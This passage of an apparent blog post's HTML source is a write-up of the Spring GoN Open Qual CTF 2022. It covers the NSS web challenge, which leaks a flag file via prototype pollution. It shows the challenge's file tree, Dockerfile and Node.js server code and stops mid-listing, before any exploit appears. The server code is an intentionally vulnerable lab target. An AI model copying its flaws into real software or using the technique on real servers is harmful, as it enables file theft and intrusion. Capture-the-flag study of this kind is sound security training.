<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Spring GoN Open Qual CTF 2022 Write Up" />
<meta property="og:locale" content="en" />
<meta name="description" content="This article is about write-up for the Spring GoN Open Qual CTF 2022. there is only two web challenges, both of which contain an Prototype Pollution and RCE bug" />
<meta property="og:description" content="This article is about write-up for the Spring GoN Open Qual CTF 2022. there is only two web challenges, both of which contain an Prototype Pollution and RCE bug" />
<link rel="canonical" href="http://localhost:4000/posts/GoN-CTF/" />
<meta property="og:url" content="http://localhost:4000/posts/GoN-CTF/" />
<meta property="og:site_name" content="Web2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-03-22T08:29:53+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Spring GoN Open Qual CTF 2022 Write Up" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-22T08:29:53+09:00","datePublished":"2022-03-22T08:29:53+09:00","description":"This article is about write-up for the Spring GoN Open Qual CTF 2022. there is only two web challenges, both of which contain an Prototype Pollution and RCE bug","headline":"Spring GoN Open Qual CTF 2022 Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/GoN-CTF/"},"url":"http://localhost:4000/posts/GoN-CTF/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Spring GoN Open Qual CTF 2022 Write Up | Web2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web2.0">
<meta name="application-name" content="Web2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">


  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
  <style>
  hr {
    background:white;
    height:1px;
    border:0;
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
    border: 1px solid var(--color__border-l1);
    border-radius: 4px;
    background-color: var(--color__bg-l1);
    display: flex;
    flex-direction: column;
    padding: 1rem;
    cursor: pointer
}

:root,:root.dark {
    --color__label-red: #ed2360;
    --color__label-yellow: #ffd330;
    --color__label-green: #17a05a;
    --color__label-blue: #2d20e2;
    --color__label-purple: #7549ff;
    --color__label-cyan: #18b4f8;
    --color__text-primary: #e6e6e6;
    --color__text-secondary: #adabb2;
    --color__text-tertiary: #8d8a99;
    --color__text-disabled: #6b6680;
    --color__text-yellow: #ffe878;
    --color__text-destructive: #ff6a8c;
    --color__text-primary-inv: #3f3c4f;
    --color__bg-l0: #1a1825;
    --color__bg-l1: #22202d;
    --color__bg-l2: #2e2b3b;
    --color__bg-l3: #3a3649;
    --color__bg-sidebar: #22202d;
    --color__bg-main: #1a1825;
    --color__bg-hover-l0: #1e1c2b;
    --color__bg-hover-l1: #272432;
    --color__bg-hover-l2: #332f41;
    --color__bg-l0-inv: #fff;
    --color__border-l0: #322f3f;
    --color__border-l1: #322f3f;
    --color__border-l2: #403c4d;
    --color__border-l3: #4f4c5f;
    --color__border-tertiary: rgba(208,204,255,.059);
    --color__overlay: #110f19;
    --font-size__header-xl: 1.625rem;
    --font-size__header-lg: 1.5rem;
    --font-size__header-md: 1.375rem;
    --font-size__header-sm: 1.25rem;
    --font-size__core-copy: 1.125rem;
    --font-size__lg: 1.063rem;
    --font-size__md: 0.938rem;
    --font-size__sm: 0.813rem;
    --color__alert-warning-text: #ebfcff;
    --color__alert-warning-text-secondary: #a1e6ff;
    --color__alert-warning-bg: #052947;
    --color__alert-warning-border: #085f96;
    --color__alert-error-text: #fff0f2;
    --color__alert-error-text-secondary: #ffcbd5;
    --color__alert-error-bg: #650126;
    --color__alert-error-border: #c70948
}
@media(prefers-reduced-motion:no-preference) {
    a {
        transition: color .2s ease-in-out
    }
}
.core-app-profile__bodybottom {
	width:100%;
	order:3;
	display:flex;
	flex-direction:column;
	gap:2rem
}

.profile--audithistory--loadmore {
	text-align:center
}
.profile--audithistory--loadmore hr {
	height:2px;
	background:#7549ff
}
.profile--audithistory--loadmore button {
	color:#fff;
	font-size:16px;
	width:max-content;
	margin:5px auto;
	display:flex;
	flex-direction:row;
	gap:5px;
	justify-content:center;
	align-items:center;
	cursor:pointer
}
.profile--audithistory--loadmore button svg {
	width:16px;
	height:16px
}
.profile--audithistory--loadmore button svg path {
	fill:#7549ff
}
.profile--audithistory--loadmore .audithistory--unavailable {
	margin-top:1rem;
	border:2px solid #2e2b3b;
	border-radius:.25rem;
	padding:1rem
}
.profile--audithistory--loadmore .audithistory--unavailable p {
	font-size:.875rem;
	line-height:1.125rem;
	text-align:start
}
.profile--audithistory--loadmore .audithistory--unavailable p strong {
	color:#fff
}
.profile--audithistory--auditsponsorimg {
	min-width:50px;
	min-height:50px;
	max-width:50px;
	max-height:50px;
	border-radius:50%
}
.profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	left:-15px;
	align-items:flex-end
}
.profile--audithistory--auditheading--date {
	font-size:14px;
	line-height:18px
}
.profile--audithistory--auditheading--title {
	font-size:20px;
	line-height:24px;
	color:#fff
}
.profile--audithistory--monthwrapper {
	margin-top:30px
}
.profile--audithistory--auditwrapper {
	position:relative;
	height:auto;
	margin:10px 0 30px 15px
}
.profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	margin-bottom:25px
}
.profile--audithistory--heading p {
	font-size:18px;
	color:#fff;
	white-space:nowrap
}
.profile--audithistory--heading hr {
	border:1px solid #2e2b3b;
	width:100%;
	height:1px
}
.profile--auditseverity {
	position:relative
}
.profile--auditseverity--lineconnector {
	position:relative;
	left:9px;
	min-height:15px;
	width:.5px;
	background-color:#2e2b3b
}
.profile--auditseverity--lineconnector:last-of-type {
	position:absolute;
	bottom:0
}
.profile--auditseverity--ring {
	width:25px;
	height:25px;
	border-radius:50%;
	display:flex;
	align-items:center;
	justify-content:center;
	position:relative;
	left:-3px
}
.profile--auditseverity--ring--inner {
	border-radius:50%;
	width:5px;
	height:5px;
	background:#fff
}
.profile--auditseverity--severity {
	position:relative;
	display:flex;
	margin-left:45px;
	top:-24px
}
.profile--auditseverity--severity--heading {
	color:var(--color__text-primary)
}
.profile--auditseverity--severity--content {
	margin-left:8px
}
.profile--auditseverity--severity--content--flexwrapper {
	display:flex;
	column-gap:8px;
	row-gap:5px;
	align-items:center;
	flex-wrap:wrap;
	margin-bottom:5px
}
.profile--auditseverity--severity--decorator {
	min-width:4px;
	max-width:4px;
	height:auto
}
.profile--auditseverity--severity--locked {
	font-size:12px;
	display:flex;
	gap:5px;
	flex-direction:row;
	justify-content:flex-start;
	align-items:center
}
.profile--auditseverity--severity--title {
	color:#fff;
	font-weight:semibold;
	overflow-wrap:anywhere
}
.core-app-profile--audithistory--monthwrapper {
	margin-top:40px;
	display:flex;
	flex-direction:column;
	gap:1rem
}
.core-app-profile--audithistory--monthwrapper:first-child {
	margin-top:0
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
	border-radius:4px;
	background-color:var(--color__bg-l1);
	display:flex;
	flex-direction:column;
	padding:1rem;
	cursor:pointer
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center;
	justify-content:space-between
}
.core-app-profile--audithistory--content-wrapper {
	
	flex:1 1;
	position:relative;
	display:flex;
	flex-direction:column;
	gap:14px
}
@media(min-width:450px) {
	.core-app-profile--audithistory--content-wrapper {
		flex-direction:row;
		align-items:center;
		justify-content:space-between
	}
}
.core-app-profile--audithistory--header-wrapper {
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center
}
.core-app-profile--audithistory--title {
	font-size:20px;
	line-height:24px;
	font-weight:700;
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--date {
  text-overflow:ellipsis
	white-space:nowrap
}
.core-app-profile--audithistory--wrapper {
	display:flex;
	flex-direction:column-reverse;
	height:100%
}
  </style>

  <!-- A placeholder to allow defining custom metadata -->

  <script src="https://code4rena.com/_next/static/chunks/app/%5B@username%5D/page-20c23029062acd7f.js"></script>
</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/ant.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web2.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Amennnn</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <li class="nav-item">
          <a href="https://evm.pics" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i><span>ABOUT</span>
          </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://x.com/l0ptus"
          aria-label="x"
          

          

          

          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://blockscan.com/address/0xc39777E85d97a0B5655C62C6378F00D494feAce1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    style="background-color:#030014"
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>Spring GoN Open Qual CTF 2022 Write Up</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Spring GoN Open Qual CTF 2022 Write Up</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1647905393"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Mar 22, 2022
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://x.com/l0ptus">anonymous</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3656 words"
>
  <em>20 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h2 id="summary"><span class="me-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>This time I did participate in CTF because GoN team of Kaist hosted the CTF. I was hacking to dawn after long time and I solved two challenges:ColorfulMemo, NSS.</p>

<ul>
  <li><a href="#Q-NSS-897-pts">[Q] - NSS</a></li>
  <li><a href="#V-ColorfulMemo-490-pts">[V] - ColorfulMemo</a></li>
</ul>

<p>I gave up that i felt it’s so hard challenge while analysing this challenge called Trino: Albireo.</p>

<hr />
<h3 id="q---nss-897-pts"><span class="me-2">(Q) - NSS [897 pts]</span><a href="#q---nss-897-pts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>This is a challenge that leak a local file using Prototype Pollution. Personally, this challenge of Prototype Pollution is best I solved latest.</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>❯ tree <span class="nt">-I</span> <span class="s2">"node_modules"</span>
<span class="nb">.</span>
├── Dockerfile
├── file.js
├── flag
├── main.js
├── package-lock.json
├── package.json
├── user.js
└── workspace.js

0 directories, 8 files
</pre></td></tr></tbody></table></code></div></div>
<p>they provided the code of challenge, but it was a little than thought.</p>

<div class="language-docker highlighter-rouge"><div class="code-header">
        <span data-label-text="Docker"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> node:current-alpine3.15</span>

<span class="k">WORKDIR</span><span class="s"> /usr/src/app</span>

<span class="k">COPY</span><span class="s"> package*.json ./</span>

<span class="k">RUN </span>npm <span class="nb">install</span>
<span class="k">RUN </span>npm <span class="nb">install</span> <span class="nt">-g</span> npm@8.5.4

<span class="k">COPY</span><span class="s"> . .</span>

<span class="k">EXPOSE</span><span class="s"> 80</span>

<span class="k">CMD</span><span class="s"> [ "node", "main.js" ]</span>
</pre></td></tr></tbody></table></code></div></div>
<p>In docker file, there is no important setting but I could know the location of flag is <code class="language-plaintext highlighter-rouge">/usr/src/app/flag</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">express</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span> 

<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nf">json</span><span class="p">());</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[*] Server Started!</span><span class="dl">"</span><span class="p">));</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">204</span><span class="p">);</span>
<span class="p">});</span>

<span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./user.js</span><span class="dl">'</span><span class="p">)(</span><span class="nx">app</span><span class="p">);</span>
<span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./workspace.js</span><span class="dl">'</span><span class="p">)(</span><span class="nx">app</span><span class="p">);</span>
<span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./file.js</span><span class="dl">'</span><span class="p">)(</span><span class="nx">app</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>
<p>main.js call a total of three Apis:user.js, workspace.js, file.js.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">os</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">os</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">appPrefix</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">nss</span><span class="dl">'</span><span class="p">;</span>

<span class="nx">users</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">tokens</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">salt</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">randomBytes</span><span class="p">(</span><span class="mi">128</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">function</span> <span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">sess</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">[</span><span class="nx">token</span><span class="p">]</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">sess</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">sess</span><span class="p">.</span><span class="nx">owner</span> <span class="o">!=</span> <span class="nx">userid</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">sess</span><span class="p">.</span><span class="nx">expire</span> <span class="o">&lt;</span> <span class="nb">Date</span><span class="p">.</span><span class="nf">now</span><span class="p">()</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">){</span>
        <span class="nx">tokens</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">cleanup_user</span><span class="p">(</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nf">rmSync</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="p">{</span><span class="na">recursive</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
<span class="p">};</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">app</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">res</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">users</span><span class="p">:</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">users</span><span class="p">)});</span>
    <span class="p">});</span>

    <span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">pass</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">pass</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">pass</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or password</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">pass</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Password too short</span><span class="dl">"</span><span class="p">});</span>
        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">user</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ID already exists</span><span class="dl">"</span><span class="p">});</span>

        <span class="nx">base_dir</span> <span class="o">=</span> <span class="dl">""</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nx">base_dir</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nf">mkdtempSync</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">os</span><span class="p">.</span><span class="nf">tmpdir</span><span class="p">(),</span> <span class="nx">appPrefix</span><span class="p">));</span>
            <span class="p">}</span>
        <span class="k">catch</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>
        <span class="p">};</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">base_dir</span><span class="p">)</span> 
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>
            
        
        <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
            <span class="na">userid</span> <span class="p">:</span> <span class="nx">userid</span><span class="p">,</span>
